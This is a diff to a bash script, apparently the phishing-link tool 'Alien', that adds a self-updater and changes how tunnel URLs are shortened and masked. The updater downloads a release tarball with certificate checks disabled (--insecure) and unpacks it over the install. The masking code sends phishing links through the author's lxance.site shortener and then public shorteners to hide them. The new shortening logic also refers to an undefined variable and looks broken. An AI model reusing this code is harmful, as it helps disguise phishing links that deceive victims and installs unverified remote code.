@@ -1,6 +1,6 @@
 #!/bin/bash
 
-__version__="1.5"
+__version__="1.6"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
@@ -65,6 +65,44 @@ kill_pid() {
 			killall ${process} > /dev/null 2>&1 # Kill the Process
 		fi
 	done
+}
+
+# Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/LxaNce-Hacker/Alien/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/LxaNce-Hacker/Alien/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".Alien.tar.gz" "${tarball_url}"
+
+		if [[ -e ".Alien.tar.gz" ]]; then
+			tar -xf .Alien.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .Alien.tar.gz
+			popd > /dev/null 2>&1
+			echo -ne "\n\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run Alien again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -335,21 +373,23 @@ Cleanuri() {
 
 custom_url() {
 	url=${1#http*//}
-	cleanuri="https://cleanuri.com/api/v1/shorten"
+	sleep 2
+	lxance="https://lxance.site/u/?url="
 	isgd="https://www.is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
-		if [[ $(curl -i -s -X POST -d "url=https://example.com" https://cleanuri.com/api/v1/shorten | grep -i 'HTTP/' | awk '{print $2}') == 2* ]]; then
-			Cleanuri $cleanuri "https://$url"
-		elif [[ $(site_stat $isgd) == 2* ]]; then
-			shorteny $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com) ]]; then
+		if [[ $(site_stat $lxance) == 2* ]]; then
+            shorten $lxance "$url"
+            if [[ $(site_stat $isgd) == 2* ]]; then
+				shorteny $isgd "$processed_url"
+			elif [[ $(site_stat $shortcode) == 2* ]]; then
+				shorten $shortcode "$processed_url"
+			else
+				shorten $tinyurl "$url"
+			fi
 		fi
 
 		url="https://$url"
@@ -415,7 +455,9 @@ main_menu() {
 }
 
 ## Main
+banner
 kill_pid
 dependencies
+check_status
 install_cloudflared
 main_menu
